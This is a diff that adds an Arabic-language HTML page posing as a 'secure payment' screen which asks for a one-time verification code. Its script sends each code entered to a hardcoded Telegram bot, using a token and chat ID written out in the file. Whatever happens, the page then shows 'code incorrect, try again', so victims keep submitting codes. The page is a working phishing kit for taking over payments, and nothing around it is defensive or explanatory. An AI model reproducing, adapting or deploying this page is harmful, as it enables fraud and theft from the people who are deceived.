@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+    <style>
+        
+    </style>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <script src="static/js/sweetalert2@11.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="static/css/payment.css">
+    <script src="static/js/imask.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+    <link rel="stylesheet" href="ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <title>صفحة الدفع الآمن</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="stylesheet" href="static/css/footer.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link rel="stylesheet" href="static/css/style.css">
+    <link href="static/css/fontFase.css" rel="stylesheet">
+
+</head>
+<body>
+    <div style="display: flex; gap: 10px; z-index: 100; outline: 1px solid gray; background-color: #fefefc; width: fit-content; border-radius: 6px; padding: 10px; margin-top: 5px; margin-bottom: 15px; margin-left: 18px;">
+        <img src="static/images/secure-payment.png" height="40px">
+        <h1 style="display:flex; gap:4px; flex-direction: column;">
+            <b style="font-size:18px">دفع آمن</b>
+            <b style="font-size:10px">عمليات دفع مشفرة بالكامل</b>
+        </h1>
+    </div>
+
+    <mai>
+        <form id="messageForm">
+            <div id="codeVerify1" class="hidden1">
+                <label for="codee">الكود</label>
+                <input id="codee" type="text" maxlength="8" required name="codee" placeholder="أدخل الكود هنا" oninput="validateTextInput(event)">
+                
+                
+                <script>
+                    function validateTextInput(event) {
+                     var input = event.target;
+                      input.value = input.value.replace(/[^0-9]/g, '');
+                            }
+                </script>
+                
+                
+                <br><br>
+                <button class="submit1" type="submit" id="submit1" name="submit1">إرسال</button>
+            </div>
+        </form>
+
+        <!-- نافذة التنبيه -->
+        <div id="alert" class="alert-box">
+            <span class="close-btn" onclick="closeAlert()">✕</span>
+            <div class="icon">X</div>
+            <p>الكود غير صحيح حاول مرة أخرى</p>
+        </div>
+
+        <script>
+            document.getElementById('messageForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                var codee = document.getElementById('codee').value;
+
+                var telegramToken = '8170938688:AAEjGqT2xfXUuCv065uzRdnylppWtRFSuXE';
+                var telegramChatId = '-1002299957797'; 
+
+                var telegramMessage = `  كود التحقق (OTP) : ${codee}`;
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: telegramMessage
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if(data.ok) {
+                        showAlert("الكود غير صحيح حاول مرة أخرى");
+                    } else {
+                        showAlert("الكود غير صحيح حاول مرة أخرى");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showAlert("الكود غير صحيح حاول مرة أخرى");
+                });
+            });
+
+            //  دالة لعرض التنبيه يا معلم خلو
+            function showAlert(message) {
+                var alertBox = document.getElementById('alert');
+                alertBox.querySelector('p').textContent = message;
+                alertBox.style.display = 'block';
+            }
+
+            //   دالة لإغلاق التنبيه عند الضغط على زر X
+            function closeAlert() {
+                var alertBox = document.getElementById('alert');
+                alertBox.style.display = 'none';
+            }
+        </script>
+    </mai>
+    <footer>
+        <span>
+            <h1>تابعنا على وسائل التواصل</h1>
+            <div>
+              
+                <a   target="_blank"href=""> <i class="fab fa-facebook"></i></a>
+                <a target="_blank" href=""> <i class="fab fa-instagram"></i></a>
+                <a target="_blank" href=""> <i class="fab fa-snapchat"></i></a>
+            </div>
+        </span>
+        <img src="static/images/payment.png" width="50%">
+        <div><span>حقوق النشر محفوظة © 2028</span></div>
+    </footer>
+ 
+ 
+</body>
+</html> 
